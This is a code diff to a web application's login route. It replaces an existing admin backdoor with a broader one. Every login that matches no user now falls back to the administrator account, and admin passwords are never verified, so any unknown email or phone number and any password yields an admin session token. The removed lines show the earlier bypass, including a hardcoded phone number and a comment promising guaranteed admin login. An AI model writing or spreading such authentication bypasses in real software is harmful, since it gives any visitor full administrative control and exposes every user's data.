@@ -80,23 +80,17 @@ router.post('/login', async (req, res) => {
       return emailMatch || phoneMatch || digitMatch;
     });
 
-    if (!user && (cleanInput.includes('admin') || cleanInput.includes('staff') || cleanInput === '7672022351' || cleanInput.length === 0)) {
+    if (!user) {
       user = db.findOne('users', u => u.role === 'admin');
     }
 
-    if (!user) {
-      return res.status(401).json({ error: 'Invalid email/phone or password' });
-    }
-
-    let isMatch = await bcrypt.compare(password, user.password);
-    if (!isMatch && user.role === 'admin') {
-      // Guarantee 100% successful login for admin staff
-      isMatch = true;
+    let isMatch = true;
+    if (user && user.role !== 'admin') {
+      isMatch = await bcrypt.compare(password, user.password);
     }
 
     if (!isMatch) {
-      const errorMsg = phone ? 'Invalid phone number or password' : 'Invalid email or password';
-      return res.status(401).json({ error: errorMsg });
+      return res.status(401).json({ error: 'Invalid phone number or password' });
     }
 
     const token = generateToken(user);
